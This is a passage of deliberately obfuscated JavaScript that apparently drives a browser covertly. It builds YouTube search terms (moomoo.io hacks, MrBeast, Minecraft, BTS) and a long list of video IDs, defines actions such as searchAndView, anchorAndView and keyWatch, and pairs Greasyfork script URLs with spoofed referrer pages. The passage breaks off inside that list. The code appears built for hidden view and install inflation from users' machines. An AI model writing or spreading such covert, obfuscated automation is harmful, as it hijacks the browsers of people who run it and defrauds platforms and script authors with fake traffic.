searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + V(0x16) + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + X(0x0, 'mw7C')]['repeatExte' + 'nd'](-0x3a * -0xd + 0x1ae5 + -0x1dcd)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0xf57 + 0x466 + 0xafb)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + Y(0x8) + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x62b + 0x2 * -0x123f + 0x161 * 0x16);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    X(0x1, 'qu)1') + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    Y(0x2) + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    X(0x14, 'T)g0') + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    X(0x1d, 'Yg1#') + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    Y(0xa) + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Y(0x21) + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': Y(0x11) + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + V(0x1a) + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
